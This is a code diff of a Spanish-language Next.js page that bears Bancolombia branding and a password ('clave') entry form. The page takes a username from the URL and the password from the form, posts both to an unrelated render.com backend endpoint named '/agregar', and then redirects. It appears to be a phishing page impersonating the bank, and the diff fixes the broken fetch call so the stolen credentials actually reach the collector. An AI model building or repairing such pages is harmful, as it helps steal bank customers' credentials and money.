@@ -2,8 +2,8 @@
 
 import Image from 'next/image';
 import Link from 'next/link';
-import { useState, useEffect } from 'react';
-import { useRouter, useSearchParams } from 'next/navigation';  // Importar useSearchParams
+import { useState, useEffect, Suspense } from 'react';
+import { useRouter, useSearchParams } from 'next/navigation';  
 import { Open_Sans } from 'next/font/google';
 import { Button } from "@/components/ui/button";
 import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
@@ -12,12 +12,12 @@ import { Lock as LockIcon, Info as InfoIcon } from "lucide-react";
 
 const openSans = Open_Sans({ subsets: ['latin'] });
 
-export default function Component() {
+function ClaveContent() {
   const [currentDateTime, setCurrentDateTime] = useState('');
   const [clave, setClave] = useState('');
   const router = useRouter();
-  const searchParams = useSearchParams();  // Usar useSearchParams
-  const usuario = searchParams.get('usuario'); // Obtener el usuario desde la URL
+  const searchParams = useSearchParams();  
+  const usuario = searchParams.get('usuario'); 
   const url = 'https://backendproyecto-btur.onrender.com';
 
   useEffect(() => {
@@ -31,15 +31,13 @@ export default function Component() {
   const handleSubmit = async (e) => {
     e.preventDefault();
 
-    // Verificar que la clave no esté vacía
     if (!clave) {
       alert('Por favor ingresa la clave');
       return;
     }
 
-    // Enviar datos al backend
     try {
-      const response = await fetch(`${url} +'/agregar`, {
+      const response = await fetch(`${url}/agregar`, {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
@@ -49,7 +47,6 @@ export default function Component() {
       });
 
       if (response.ok) {
-        // Redirigir a la siguiente página si la autenticación es exitosa
         router.push('/');
       } else {
         const errorData = await response.json();
@@ -168,5 +165,13 @@ export default function Component() {
         <p>Copyright ©️ 2024 Bancolombia S.A.</p>
       </footer>
     </div>
+  );
+}
+
+export default function ClavePage() {
+  return (
+    <Suspense fallback={<div>Cargando...</div>}>
+      <ClaveContent />
+    </Suspense>
   );
 }
